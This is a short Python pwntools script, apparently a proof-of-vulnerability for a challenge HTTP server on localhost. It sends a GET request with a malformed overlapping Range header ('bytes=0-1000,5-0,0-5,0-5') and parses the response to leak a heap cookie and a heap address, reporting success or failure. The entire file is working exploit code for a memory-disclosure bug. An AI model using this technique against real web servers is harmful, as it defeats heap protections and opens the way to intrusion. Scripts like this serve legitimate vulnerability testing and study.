from pwn import *

p = remote('localhost', 9999)

req = b'GET /index.html HTTP/1.1\r\n'
req += b'Range: bytes=0-1000,5-0,0-5,0-5\r\n'
req += b'Host: chess\r\n\r\n'

p.send(req)

y = p.read(2000)

st = y.find(b'\x00\x00\x00\x00') + 4

cookie_start = y[st:]

cookie = u32(cookie_start[0:4])

print('[LEAK] Heap cookie: 0x%x' %(cookie))

st = 8

while st < len(cookie_start):
    if cookie_start[st] != 0:
        addr_leak = u64(cookie_start[st:st+8]) & 0xffffffffffff
        print('[LEAK] Heap Address: 0x%.8x' %(addr_leak))
        p.close()
        print('[SUCCESS] PoV completed successfully')
        exit(0)
    st += 1

print('[FAIL] POV did not succeed')
p.close()
exit(1)
